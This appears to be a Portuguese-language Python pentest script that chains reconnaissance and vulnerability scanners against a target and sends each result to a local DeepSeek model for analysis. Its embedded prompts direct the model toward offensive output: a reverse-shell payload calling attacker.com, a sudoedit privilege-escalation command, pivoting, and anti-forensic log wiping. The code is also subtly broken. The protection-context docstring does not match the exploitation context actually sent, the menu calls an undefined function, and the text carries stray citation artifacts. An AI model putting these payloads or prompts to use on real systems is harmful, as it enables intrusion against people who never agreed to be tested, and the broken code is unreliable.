#!/usr/bin/env python3
"""
Script de PenTest que consome a API do DeepSeek via Ollama.

Funcionalidades:
    - Escaneamento de um único IP/Domínio utilizando Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon e SSLyze.
    - Todos os scanners (exceto masscan) utilizam a mesma entrada (alvo) e são executados sequencialmente.
    - Cada ferramenta é executada e seu resultado é enviado individualmente para a API do DeepSeek;
      a próxima ferramenta só é acionada após o recebimento pela API da análise anterior.
    - Menu separado para executar o masscan, que solicita os parâmetros necessários.
    - Integração dos resultados de todas as ferramentas em uma única saída, enviada para a API do DeepSeek.
    - Visualização e exportação dos resultados (JSON e HTML).
    - Salvamento automático dos IPs encontrados em network_devices.txt.
    - Gravação dos resultados no banco de dados SQLite (scan_results.db).

Requisitos:
    - Python 3.7+
    - Ferramentas instaladas e acessíveis via linha de comando: Nmap, Nikto, Amass, theHarvester, sublist3r, dnsrecon, masscan e SSLyze.
    - API do DeepSeek (via Ollama) rodando localmente.
    - Bibliotecas: requests (pip install requests) e rich (pip install rich).
    - Biblioteca para banco de dados SQLite (nativa no Python) ou outro DB à sua escolha.

    1. Instalar o vulscan:
        cd /usr/share/nmap/scripts/
        git clone https://github.com/scipag/vulscan.git
        nmap --script-updatedb

    2. Instalar o vulners:
        cd /usr/share/nmap/scripts/
        git clone https://github.com/vulnersCom/nmap-vulners.git
        nmap --script-updatedb

Autor: Thalles Canela
Data: 2025-02-02 (Atualizado: 2025-02-08)
"""

import os
import subprocess
import json
import re
import socket
from datetime import datetime
import requests
from rich.console import Console

# ==================== CONFIGURAÇÕES GLOBAIS ====================

API_ENDPOINT = "http://localhost:5000/analyze"
API_KEY = "sk_prod_1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

### Você pode escolher qual será contexto da análise: Proteção ou Exploração ###
CONTEXT_MESSAGE_Misto = (
    "Observação: Fornecer uma análise técnica independente para cada ferramenta de scan, "
    "tratando cada envio como um contexto completamente novo. "
    "Ignore quaisquer dados ou análises anteriores - cada requisição deve ser processada isoladamente.\n\n"
    "DIRETRIZES PARA ANÁLISE TÁTICA COMBINADA (MITRE ATT&CK + OWASP Top 10):\n"
    "Cada análise deve integrar perspectivas defensivas e ofensivas baseadas exclusivamente nos dados da ferramenta atual.\n\n"
    
    "REQUISITOS TÉCNICOS:\n"
    "1. MAPEAMENTO DUPLO: Para cada vulnerabilidade:\n"
    "   a) [Proteção] CWE-ID + CIS Controls correspondente\n"
    "   b) [Ataque] TTP-ID MITRE ATT&CK + ExploitDB Reference\n"
    "2. ANÁLISE ESTRATIFICADA:\n"
    "   - Camada de Rede: CVSS v3.1 + Impacto em PCI-DSS/HIPAA\n"
    "   - Camada Aplicação: OWASP Risk Rating + Impacto em GDPR\n"
    "3. DETALHAMENTO OPERACIONAL:\n"
    "   - Comandos EXATOS para validação (ex: curl, nmap scripts)\n"
    "   - Configurações SPECÍFICAS para hardening\n"
    "   - Payloads PRONTOS para exploração (ex: reverse shells)\n\n"
    
    "FLUXO DE ANÁLISE POR CAMADA (POR FERRAMENTA):\n"
    "1. IDENTIFICAÇÃO:\n"
    "   - [Tática] Mapear para Phase Matrix (Recon, Exploitation, etc)\n"
    "   - [Técnica] Associar à matriz MITRE (ex: T1595.003 para scanning)\n"
    "   - [Procedimento] Listar procedimentos do adversário (Ex: Brute Force via Nmap scripts)\n\n"
    
    "2. PROFUNDIDADE TÉCNICA:\n"
    "   a) Para defensores:\n"
    "      - WAF Rules (ModSecurity snippet)\n"
    "      - SIEM Detection Rules (Sigma format)\n"
    "      - Patch Management Steps\n"
    "   b) Para atacantes:\n"
    "      - Exploit Crafting (Python PoC skeleton)\n"
    "      - Privilege Escalation Paths\n"
    "      - Pivoting Opportunities\n\n"
    
    "MODELO DE SAÍDA AVANÇADO:\n"
    "=================================\n"
    "[NMAP] Port 445/tcp - SMB v3.1.1 (Windows 10 19042)\n"
    "[PROTEÇÃO] CWE-200: Exposure Sensitive Info\n"
    "   - CIS Control 9: Limit Network Ports/Protocols\n"
    "   - Hardening: `Set-SmbServerConfiguration -EncryptData $true`\n"
    "[ATAQUE] T1570: Lateral Tool Transfer\n"
    "   - Exploit: EternalBlue (MS17-010) via metasploit/auxiliary/scanner/smb/smb_ms17_010\n"
    "   - Post-Exploit: `invoke-SMBExec -Target IP -Command 'net group \"Domain Admins\" /domain'`\n"
    "[COMPLIANCE] Violates PCI-DSS Req 1.2.1: Standard Firewall Configurations\n"
    "=================================\n\n"
    
    "ELEMENTOS OBRIGATÓRIOS:\n"
    "- Referências CWE/MITRE/OWASP\n"
    "- Comandos executáveis em Linux/Windows\n"
    "- Impacto regulatório (GDPR, LGPD, PCI-DSS)\n"
    "- Validação de falsos positivos via 3 métodos distintos"
)

CONTEXT_MESSAGE_Protecao = (
    "DIRETRIZES PARA HARDENING TÁTICO (NIST SP 800-53 + CIS CRITICAL SECURITY CONTROLS):\n"
    "Cada análise deve produzir um plano de remediação prioritário com métricas mensuráveis.\n\n"
    "Cada relatório deve ser processado como uma unidade independente - não há compartilhamento de contexto entre ferramentas.\n\n"
    
    "COMPONENTES ESSENCIAIS:\n"
    "1. CLASSIFICAÇÃO DE RISCO:\n"
    "   - Probabilidade: Modelo FAIR (Frequência, Tempo de Exposição)\n"
    "   - Impacto: Modelo DREAD (Damage, Reproducibility, etc)\n"
    "2. PLANO DE AÇÃO:\n"
    "   - Prioridade 1 (Crítico): Remediar em 24h\n"
    "   - Prioridade 2 (Alto): Remediar em 72h\n"
    "   - Prioridade 3 (Médio): Remediar em 14 dias\n"
    "3. AUTOMAÇÃO:\n"
    "   - Ansible Playbooks para correções\n"
    "   - Terraform scripts para ajustes de infra\n"
    "   - PowerShell DSC para Windows hardening\n\n"
    
    "SAÍDA DETALHADA (EXEMPLO):\n"
    "=================================\n"
    "[CVE-2023-1234] Apache Log4j 2.0 < 2.17.0\n"
    "Risk Score: 9.8 CRITICAL (CVSS v3.1)\n"
    "Affected Assets: 10 servers (tag: 'web-prod')\n"
    "Remediation:\n"
    "1. Patch: `ansible-galaxy install apache_log4j2 --version 2.17.1`\n"
    "2. Workaround: Set JVM option `-Dlog4j2.formatMsgNoLookups=true`\n"
    "3. Detection: Sigma rule 'log4j_jndi_detection'\n"
    "Validation:\n"
    " - `curl -X POST ${jndi:ldap://test}` → Blocked by WAF\n"
    " - Auditd logs show prevented exploitation attempts\n"
    "Compliance: Fails ISO 27001 A.12.6.1 (Technical Vulnerability Management)\n"
    "=================================\n\n"
    
    "ARTEFATOS OBRIGATÓRIOS:\n"
    "- Matriz de risco quantitativa\n"
    "- Playbooks de automação executáveis\n"
    "- Métricas de eficácia pós-remediação\n"
    "- Relatório de conformidade regulatória"
)

CONTEXT_Exploracao = (
    "DIRETRIZES PARA OPERAÇÃO OFENSIVA (CYBER KILL CHAIN + PENETRATION TESTING EXECUTION STANDARD):\n"
    "Cada análise deve simular uma campanha APT usando exclusivamente os dados do scanner atual.\n\n"
    "Cada conjunto de dados deve ser tratado como um cenário autônomo para exploração - sem memória entre requisições.\n\n"
    
    "COMPONENTES DE ATAQUE:\n"
    "1. TÁTICAS AVANÇADAS:\n"
    "   - Initial Access: Phishing, Exploit Public Apps\n"
    "   - Execution: Command-Line Interfaces, API Abuse\n"
    "   - Persistence: Cron Jobs, Registry Modifications\n"
    "2. TÉCNICAS DE EVASÃO:\n"
    "   - Obfuscation: XOR Encryption, Packers\n"
    "   - Living-off-the-Land: LOLBAS/Win32 Abuse\n"
    "3. POST-EXPLOITAÇÃO:\n"
    "   - Credential Dumping (Mimikatz, LaZagne)\n"
    "   - Lateral Movement (Pass-the-Hash, RDP Hijacking)\n\n"
    
    "MODELO DE OPERAÇÃO OFENSIVA:\n"
    "=================================\n"
    "[PHASE 1] Initial Compromise via SSH (Port 22/tcp)\n"
    "Exploit: CVE-2021-41617 (OpenSSH 8.7 < 8.9)\n"
    "Payload: `ssh -oPubkeyAcceptedKeyTypes=+ssh-rsa user@target 'mkfifo /tmp/f;sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect attacker.com:443 > /tmp/f; rm /tmp/f'`\n"
    "[PHASE 2] Privilege Escalation\n"
    "Technique: Sudoers misconfig (CVE-2023-22809)\n"
    "Command: `sudoedit -s /\\\' `perl -e 'exec sh'`\n"
    "[PHASE 3] Pivoting\n"
    "Method: SSH Dynamic Port Forwarding\n"
    "Command: `ssh -D 1080 -N -f user@compromised_host`\n"
    "=================================\n\n"
    
    "ELEMENTOS CHAVE:\n"
    "- Chain de exploração completo (Initial Access → Data Exfil)\n"
    "- Técnicas fileless onde aplicável\n"
    "- Mapas de calor de IoCs (Indicators of Compromise)\n"
    "- Táticas de contra-forense (log wiping, timestomping)"
)

RESULTS_FILE = "results.json"
NETWORK_DEVICES_FILE = "network_devices.txt"

console = Console()

def save_to_json(timestamp, target, combined_output, analyses):
    """
    Insere um novo registro no arquivo JSON (results.json).
    Se o arquivo não existir, cria um array; caso exista, carrega e adiciona ao final.
    """
    record = {
        "timestamp": timestamp,
        "target": target,
        "combined_output": combined_output,
        "analysis": analyses
    }

    # Carrega registros existentes (se houver)
    try:
        if os.path.exists(RESULTS_FILE):
            with open(RESULTS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if not isinstance(data, list):
                    data = [data]
        else:
            data = []
    except Exception:
        data = []

    # Adiciona novo registro e salva de volta
    data.append(record)
    with open(RESULTS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

# ==================== FUNÇÕES AUXILIARES ====================

def normalize_target(target):
    """
    Normaliza o alvo removendo prefixos como http://, https://, www., etc.,
    garantindo que o formato seja adequado para as diferentes ferramentas.
    - Para IPs: retorna o IP sem modificações.
    - Para domínios: remove protocolos e subdomínios www.
    - Mantém porta se especificada (ex: google.com:443 → google.com:443).
    - Preserva caminhos após o domínio (ex: http://site.com/path → site.com/path).
    """
    target = target.strip().lower()
    for proto in ["http://", "https://", "www.", "http", "https", "ftp://", "sftp://"]:
        if target.startswith(proto):
            target = target[len(proto):]
            break
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', target):
        target = target.lstrip("www.")
    return target

def log_message(msg):
    """Exibe uma mensagem no terminal com data/hora."""
    console.print(f"[bold][{datetime.now().isoformat()}][/bold] {msg}")

def is_ip(target):
    """Retorna True se o target for um endereço IP no formato xxx.xxx.xxx.xxx."""
    return re.match(r'^\d{1,3}(\.\d{1,3}){3}$', target) is not None

def run_nmap_scan(target):
    """
    Executa diversos scans agressivos com Nmap para o alvo especificado,
    utilizando um target normalizado (sem os prefixos).
    Retorna uma string com os resultados.
    """
    normalized_target = normalize_target(target)
    log_message(f"Iniciando scans Nmap para o alvo: {normalized_target}")
    results = {}
    commands = [
    (
        "Intensive_Scan",
        [
            "nmap",
            "-T4",
            "-A",
            "-v",
            "-Pn",
            "--reason",
            "--traceroute",
            "--version-intensity", "9",
            "--script", "vuln,exploit,default,safe,vulners,vulscan/vulscan.nse",
            "--script-args", "vulscanshowall=1,vulscanoutput=details",
            normalized_target
        ]
    ),
    (
        "Additional_Info",
        [
            "nmap",
            "-sV",
            "--version-intensity", "9",
            "--script", "asn-query,whois-ip,ip-geolocation-maxmind,default",
            normalized_target
        ]
    ),
    (
        "DDoS_Simulation",
        [
            "nmap",
            "-sU",
            "--script", "ntp-monlist,dns-recursion,snmp-sysdescr",
            "-p", "U:19,53,123,161",
            normalized_target
        ]
    ),
    (
        "Firewall_Check",
        [
            "nmap",
            "-sA",
            "-Pn",
            "--script", "firewall-bypass",
            normalized_target
        ]
    ),
    (
        "Full_Scan",
        [
            "nmap",
            "-p-",
            "-A",
            "-T4",
            "--reason",
            "--version-intensity", "9",
            "--min-rate", "500",
            "--max-retries", "2",
            "--script", "default,vulners,vulscan/vulscan.nse",
            "--script-args", "vulscanshowall=1,vulscanoutput=details",
            normalized_target
        ]
    )
]
    
    for scan_type, cmd in commands:
        log_message(f"Executando {scan_type.replace('_', ' ').lower()}...")
        try:
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
            results[scan_type] = proc.stdout
        except subprocess.CalledProcessError as e:
            error = f"Erro no {scan_type.replace('_', ' ').lower()}: {e.stderr}"
            log_message(error)
            results[scan_type] = error

    log_message(f"Scans Nmap concluídos para: {normalized_target}\n")
    combined = f"=== RESULTADOS NMAP para {normalized_target} ===\n\n"
    for key, output in results.items():
        combined += f"==== {key} ====\n{output}\n\n"
    return combined

def get_server_ip(target):
    """
    Tenta resolver o endereço IP para o domínio/host fornecido.
    Se o target já for um IP, apenas o retorna.
    """
    if is_ip(target):
        return target
    try:
        ip_address = socket.gethostbyname(target)
        log_message(f"Endereço IP resolvido para {target}: {ip_address}")
        return ip_address
    except Exception as e:
        console.print(f"[-] Erro ao resolver IP para {target}: {e}", style="bold red")
        return None

def run_nikto_scan(target):
    """
    Executa Nikto para o alvo especificado, sem salvar localmente.
    Retorna apenas a saída (stdout) ou mensagem de erro.
    """
    # Normaliza o alvo
    normalized = normalize_target(target)
    log_message(f"Iniciando Nikto para {normalized}")

    # Comando Nikto sem salvamento local
    cmd = [
        "nikto",
        "-h", normalized,
        "-Tuning", "12345678",   # todos os testes possíveis
        "-Plugins", "ALL",       # executa todos os plugins
        "-timeout", "30"         # timeout 30s para respostas lentas
    ]

    # Adiciona SSL se especificado porta 443 ou esquema HTTPS
    if ":" in normalized and normalized.endswith(":443"):
        cmd.insert(cmd.index("-h") + 2, "-ssl")

    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True
        )
        return proc.stdout

    except subprocess.CalledProcessError as e:
        error = f"Erro no Nikto: {e.stderr.strip()}"
        log_message(error)
        return error

def run_amass_enum(target):
    """Executa o Amass no modo ativo e retorna a saída."""
    normalized_target = normalize_target(target)
    log_message(f"Iniciando Amass para {normalized_target}")
    try:
        cmd = ["amass", "enum", "-active", "-d", normalized_target, "-src", "-ip"]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return proc.stdout
    except subprocess.CalledProcessError as e:
        error = f"Erro no Amass: {e.stderr}"
        log_message(error)
        return error

def run_theharvester(target):
    """Executa theHarvester e retorna a saída."""
    normalized_target = normalize_target(target)
    log_message(f"Iniciando theHarvester para {normalized_target}")
    output_file = f"output_{normalized_target.replace('.', '_')}.html"  # gera nome de arquivo dinâmico
    try:
        cmd = [
            "python3", "/opt/theHarvester/theHarvester.py",
            "-d", normalized_target,
            "-l", "500",
            "-S", "0",
            "-p",       # utilizar proxies se configurados
            "-v",       # verbose
            "-e", "8.8.8.8",  # servidor DNS
            "-n",       # DNS lookup
            "-c",       # DNS brute force
            "-f", output_file,
            "-b", "duckduckgo"
        ]
        log_message(f"Executando theHarvester com o comando: {' '.join(cmd)}")
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        log_message(f"theHarvester finalizado. Resultados salvos em {output_file}")
        return proc.stdout
    except subprocess.CalledProcessError as e:
        error = f"Erro no theHarvester: {e.stderr}"
        log_message(error)
        return error

def run_sublist3r(target):
    """Executa o Sublist3r e retorna a saída."""
    normalized_target = normalize_target(target)
    console.print(f"[bold green]Iniciando Sublist3r para {normalized_target}[/bold green]")
    try:
        cmd = [
            "python3", "/opt/Sublist3r/sublist3r.py",
            "-d", normalized_target,
            "-t", "100",
            "-o", "sublist3r_output.txt",
            "-n"
        ]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return proc.stdout
    except subprocess.CalledProcessError as e:
        error = f"Erro no Sublist3r: {e.stderr}"
        console.print(f"[bold red]{error}[/bold red]")
        return error

def run_dnsrecon(target):
    """Executa dnsrecon (modo -a) e retorna a saída."""
    log_message(f"Iniciando dnsrecon para {target}")
    try:
        cmd = ["dnsrecon", "-d", target, "-a"]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return proc.stdout
    except subprocess.CalledProcessError as e:
        error = f"Erro no dnsrecon: {e.stderr}"
        log_message(error)
        return error

def run_masscan():
    """
    Menu exclusivo para execução do masscan.
    Solicita do usuário:
      - Range de rede
      - Faixa de portas
      - Taxa de envio
    Retorna a saída.
    """
    console.print("\n==== Masscan Scan ====", style="bold blue")
    network_range = input("Digite o range de rede (ex.: 192.168.1.0/24): ").strip()
    port_range = input("Digite a faixa de portas (ex.: 0-65535): ").strip()
    rate = input("Digite a taxa de envio (ex.: 10000): ").strip()
    cmd = ["masscan", network_range, "-p" + port_range, "--rate=" + rate]
    log_message(f"Executando masscan: {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        output = proc.stdout
        console.print("\n=== Resultado do Masscan ===", style="bold blue")
        console.print(output)
        return output
    except subprocess.CalledProcessError as e:
        error = f"Erro no Masscan: {e.stderr}"
        log_message(error)
        return error

def ping_scan(network_range):
    """Executa um scan de ping (nmap -sn) para descobrir dispositivos na rede."""
    console.print(f"\n[+] Realizando ping scan na rede: {network_range}", style="bold green")
    try:
        cmd = ["nmap", "-sn", network_range]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        output = proc.stdout
        ips = re.findall(r'Nmap scan report for ([\d\.]+)', output)
        if ips:
            with open(NETWORK_DEVICES_FILE, "w", encoding="utf-8") as f:
                for ip in ips:
                    f.write(ip + "\n")
            console.print(f"[+] IPs encontrados: {', '.join(ips)}", style="bold green")
        else:
            console.print("[-] Nenhum dispositivo encontrado.", style="bold red")
        return ips
    except subprocess.CalledProcessError as e:
        console.print(f"[-] Erro no ping scan: {e.stderr}", style="bold red")
        return []

def run_sslyze_scan(target):
    """
    Executa uma varredura agressiva com SSLyze para o alvo especificado.
    - Normaliza o target e, se não houver porta, adiciona ":443" como padrão.
    - Utiliza diversas flags para testar vulnerabilidades e configurações TLS de forma agressiva.
    Retorna a saída do comando (stdout) e, se houver apenas warnings conhecidos, os anexa ao output.
    
    Correções aplicadas:
      * Não se considera o aviso "CryptographyDeprecationWarning: Parsed a negative serial number..."
        como erro fatal, conforme sugerido em discussões na issue #6609 [&#8203;:contentReference[oaicite:2]{index=2}] e
        pela documentação e suporte (ex.: [&#8203;:contentReference[oaicite:3]{index=3}]).
    """
    normalized_target = normalize_target(target)
    # Se o target não incluir a porta, adiciona ":443"
    if ":" not in normalized_target:
        normalized_target = f"{normalized_target}:443"
    
    log_message(f"Iniciando scan SSLyze para {normalized_target}")
    
    cmd = [
        "sslyze",
        "--heartbleed",
        "--fallback",
        "--certinfo",
        "--tlsv1",
        "--tlsv1_1",
        "--tlsv1_2",
        "--tlsv1_3",
        "--sslv3",
        "--sslv2",
        "--openssl_ccs",
        "--reneg",
        "--elliptic_curves",
        "--compression",
        "--early_data",
        "--resum",
        "--resum_attempts", "100",
        "--robot",
        "--mozilla_config", "modern",
        normalized_target
    ]
    
    log_message(f"Executando SSLyze com o comando: {' '.join(cmd)}")
    
    try:
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Se o código de retorno for diferente de zero, verificamos se o stderr contém apenas o aviso conhecido.
        if proc.returncode != 0:
            # Caso o stderr contenha o aviso de serial negativo (conhecido) e não haja outros erros significativos,
            # consideramos o scan como bem-sucedido, apenas com avisos.
            if "CryptographyDeprecationWarning" in proc.stderr and "negative serial number" in proc.stderr:
                combined_output = proc.stdout + "\n[AVISOS do SSLyze]\n" + proc.stderr.strip()
                log_message("Scan SSLyze concluído com avisos.")
                return combined_output
            else:
                error_msg = f"Erro no SSLyze (codigo: {proc.returncode}):\n{proc.stderr}"
                log_message(error_msg)
                return error_msg
        
        # Se não houver erro, anexa eventuais avisos (se houver) ao output.
        output = proc.stdout
        if proc.stderr.strip():
            output += "\n[AVISOS do SSLyze]\n" + proc.stderr.strip()
        log_message("Scan SSLyze concluído com sucesso.")
        return output
    
    except Exception as e:
        error_msg = f"Erro ao executar o SSLyze: {str(e)}"
        log_message(error_msg)
        return error_msg

# ==================== FUNÇÃO DE ENVIO PARA A API ====================
def send_to_deepseek(scan_data):
    """
    Envia os dados para a API do DeepSeek com o contexto de Proteção.
    Retorna a resposta da API como dicionário.
    
    Exibe o conteúdo que foi de fato enviado para a API.
    """
    payload = {
        "scan_data": scan_data,
        "context": CONTEXT_Exploracao
    }
    headers = {"X-API-Key": API_KEY}
    try:
        console.print("\n[+] Enviando dados para a API do DeepSeek...", style="bold green")
        response = requests.post(API_ENDPOINT, json=payload, headers=headers, timeout=200000)
        if response.status_code == 200:
            console.print("[+] Dados enviados com sucesso.", style="bold green")
            
            # Exibe na tela o conteúdo enviado para a API
            console.print("\n=== Conteúdo Enviado para a API ===", style="bold cyan")
            console.print(scan_data)
            
            analysis = response.json()
            display_analysis(analysis)
            return analysis
        else:
            console.print(f"[-] Erro na API. Código: {response.status_code}", style="bold red")
            return None
    except Exception as e:
        console.print(f"[-] Exceção ao enviar dados: {e}", style="bold red")
        return None

def display_analysis(analysis):
    """Exibe a análise do DeepSeek de forma formatada."""
    console.print("\n=== Análise do DeepSeek ===", style="bold blue")
    analysis_text = analysis.get("analysis", "Nenhuma análise disponível.")
    processing_time = analysis.get("processing_time", 0)
    console.print("\n[bold]Resultado da Análise:[/bold]", style="bold green")
    console.print(analysis_text, style="white")
    console.print(f"\n[bold]Tempo de Processamento:[/bold] {processing_time:.2f} segundos", style="bold green")

# ==================== FUNÇÃO NOVA: SCANS SEQUENCIAIS ====================
def run_scans_sequential(target):
    """
    Executa os scans de cada ferramenta de forma sequencial.
    Para cada ferramenta:
      - Executa o scan.
      - Envia o resultado individual para a API do DeepSeek.
      - Aguarda a resposta da API antes de prosseguir para a próxima ferramenta.
    
    Retorna um dicionário com os outputs e as análises individuais.
    """
    tool_results = {"target": target}
    
    # 1) Nmap
    console.print("\n=== Iniciando scan Nmap ===", style="bold blue")
    nmap_output = run_nmap_scan(target)
    tool_results["nmap_output"] = nmap_output
    tool_results["nmap_analysis"] = send_to_deepseek(nmap_output)
    
    # 2) Nmap adicional para IP (se aplicável)
    ip_address = get_server_ip(target)
    if ip_address and ip_address != target:
        console.print("\n=== Iniciando scan Nmap para IP resolvido ===", style="bold blue")
        nmap_ip_output = run_nmap_scan(ip_address)
        tool_results["nmap_ip_output"] = nmap_ip_output
        tool_results["nmap_ip_analysis"] = send_to_deepseek(nmap_ip_output)
    else:
        tool_results["nmap_ip_output"] = "Scan adicional não realizado (alvo já é IP ou resolução falhou)."
        tool_results["nmap_ip_analysis"] = None
    
    # 3) Nikto
    console.print("\n=== Iniciando scan Nikto ===", style="bold blue")
    nikto_output = run_nikto_scan(target)
    tool_results["nikto_output"] = nikto_output
    tool_results["nikto_analysis"] = send_to_deepseek(nikto_output)
    
    # 4) Amass (apenas se o alvo não for IP)
    if not is_ip(target):
        console.print("\n=== Iniciando scan Amass ===", style="bold blue")
        amass_output = run_amass_enum(target)
        tool_results["amass_output"] = amass_output
        tool_results["amass_analysis"] = send_to_deepseek(amass_output)
    else:
        tool_results["amass_output"] = "Amass não executado para IP."
        tool_results["amass_analysis"] = None
    
    # 5) theHarvester
    console.print("\n=== Iniciando scan theHarvester ===", style="bold blue")
    theharvester_output = run_theharvester(target)
    tool_results["theharvester_output"] = theharvester_output
    tool_results["theharvester_analysis"] = send_to_deepseek(theharvester_output)
    
    # 6) Sublist3r
    console.print("\n=== Iniciando scan Sublist3r ===", style="bold blue")
    sublist3r_output = run_sublist3r(target)
    tool_results["sublist3r_output"] = sublist3r_output
    tool_results["sublist3r_analysis"] = send_to_deepseek(sublist3r_output)
    
    # 7) dnsrecon
    console.print("\n=== Iniciando scan dnsrecon ===", style="bold blue")
    dnsrecon_output = run_dnsrecon(target)
    tool_results["dnsrecon_output"] = dnsrecon_output
    tool_results["dnsrecon_analysis"] = send_to_deepseek(dnsrecon_output)
    
    # 8) SSLyze
    console.print("\n=== Iniciando scan SSLyze ===", style="bold blue")
    sslyze_output = run_sslyze_scan(target)
    tool_results["sslyze_output"] = sslyze_output
    tool_results["sslyze_analysis"] = send_to_deepseek(sslyze_output)
    
    # Monta a saída combinada (apenas para referência ou salvamento posterior)
    combined_output = (
        f"=== RESULTADOS NMAP ===\n{tool_results.get('nmap_output', '')}\n\n"
        f"=== RESULTADOS NMAP (IP resolvido) ===\n{tool_results.get('nmap_ip_output', '')}\n\n"
        f"=== RESULTADOS NIKTO ===\n{tool_results.get('nikto_output', '')}\n\n"
        f"=== RESULTADOS AMASS ===\n{tool_results.get('amass_output', '')}\n\n"
        f"=== RESULTADOS theHarvester ===\n{tool_results.get('theharvester_output', '')}\n\n"
        f"=== RESULTADOS Sublist3r ===\n{tool_results.get('sublist3r_output', '')}\n\n"
        f"=== RESULTADOS dnsrecon ===\n{tool_results.get('dnsrecon_output', '')}\n\n"
        f"=== RESULTADOS SSLyze ===\n{tool_results.get('sslyze_output', '')}\n"
    )
    tool_results["combined_output"] = combined_output
    
    return tool_results

# ==================== FUNÇÃO PARA EXIBIR RESULTADOS DE CADA FERRAMENTA ====================
def display_sequential_results(tool_results):
    """
    Exibe no console os resultados de cada ferramenta e suas análises individuais.
    """
    console.print("\n=== RESULTADOS DOS SCANS SEQUENCIAIS ===", style="bold magenta")
    for tool in ["nmap", "nmap_ip", "nikto", "amass", "theharvester", "sublist3r", "dnsrecon", "sslyze"]:
        output = tool_results.get(f"{tool}_output", "")
        analysis = tool_results.get(f"{tool}_analysis", {})
        console.print(f"\n----- {tool.upper()} -----", style="bold blue")
        console.print("[bold]Output:[/bold]")
        console.print(output)
        console.print("[bold]Análise:[/bold]")
        if analysis:
            console.print(analysis)
        else:
            console.print("Nenhuma análise disponível.", style="bold red")

# ==================== FUNÇÃO PARA SALVAR RESULTADOS ====================
def save_result(result_data):
    """
    Salva os resultados:
      1) Em um arquivo JSON (results.json).
      2) Em um arquivo HTML com o nome do alvo.
    """
    # Salva em JSON local
    try:
        timestamp = datetime.now().isoformat()
        target = result_data.get("target", "N/A")
        combined_output = result_data.get("combined_output", "N/A")
        analyses = {
            tool: result_data.get(f"{tool}_analysis")
            for tool in [
                "nmap", "nmap_ip", "nikto", "amass",
                "theharvester", "sublist3r", "dnsrecon", "sslyze"
            ]
        }
        save_to_json(timestamp, target, combined_output, analyses)
        console.print(f"[+] Resultados gravados em '{RESULTS_FILE}'.", style="bold green")
    except Exception as e:
        console.print(f"[-] Erro ao salvar em JSON: {e}", style="bold red")

    # Salva relatório HTML
    try:
        target = result_data.get("target", "unknown_target")
        sanitized_target = re.sub(r'[^a-zA-Z0-9\-_]', '_', target)
        html_filename = f"{sanitized_target}.html"

        # Constrói conteúdo HTML com análises detalhadas
        html_content = f"""<html>
    <head>
        <meta charset='utf-8'>
        <title>Relatório de Scan - {target}</title>
        <style>
            .analysis {{ margin-bottom: 2em; border: 1px solid #ddd; padding: 1em; }}
            .tool-name {{ color: #2c3e50; font-weight: bold; }}
            pre {{ white-space: pre-wrap; word-wrap: break-word; }}
        </style>
    </head>
    <body>
        <h1>Relatório de Scan para {target}</h1>
        <h2>Resultados Combinados</h2>
        <pre>{combined_output}</pre>

        <h2>Análises da API</h2>"""

        # Adiciona cada análise ao HTML
        for tool, analysis in analyses.items():
            if analysis:
                html_content += f"""
        <div class="analysis">
            <div class="tool-name">{tool.upper()}</div>
            <pre>{json.dumps(analysis, indent=4, ensure_ascii=False)}</pre>
        </div>"""

        html_content += """
    </body>
</html>"""

        with open(html_filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        console.print(f"[+] Relatório HTML salvo como '{html_filename}'", style="bold green")
    except Exception as e:
        console.print(f"[-] Erro ao gerar relatório HTML: {e}", style="bold red")

# ==================== MENU PRINCIPAL ====================

def main_menu():

    while True:
        console.print("\n==== Menu de PenTest ====", style="bold blue")
        console.print("1. Escanear um único IP/Domínio")
        console.print("2. Escanear uma lista de IPs/Domínios")
        console.print("3. Descoberta de dispositivos na rede")
        console.print("4. Visualizar resultados salvos")
        console.print("5. Sair")
        console.print("6. Executar Masscan")
        choice = input("Escolha uma opção: ").strip()
        
        if choice == "1":
            target = input("Digite o IP ou domínio para escanear: ").strip()
            scan_results = run_scans_sequential(target)
            display_sequential_results(scan_results)
            save_result(scan_results)
        
        elif choice == "2":
            file_path = input("Digite o caminho do arquivo com a lista: ").strip()
            if not os.path.exists(file_path):
                console.print(f"[-] Arquivo '{file_path}' não encontrado.", style="bold red")
                continue
            
            with open(file_path, "r", encoding="utf-8") as f:
                targets = [line.strip() for line in f if line.strip()]
            
            for t in targets:
                console.print(f"\n=== Iniciando scans para: {t} ===", style="bold blue")
                scan_results = run_scans_sequential(t)
                console.print(scan_results["combined_output"][:500] + "...", style="bold yellow")
                
                if input(f"Salvar resultados para {t}? (s/n): ").strip().lower() == 's':
                    save_result(scan_results)
        
        elif choice == "3":
            network_range = input("Digite o range da rede (ex.: 192.168.1.0/24): ").strip()
            ping_scan(network_range)
        
        elif choice == "4":
            view_results()
        
        elif choice == "5":
            console.print("Encerrando o script.", style="bold blue")
            break
        
        elif choice == "6":
            run_masscan()
        
        else:
            console.print("Opção inválida.", style="bold red")

if __name__ == "__main__":
    main_menu()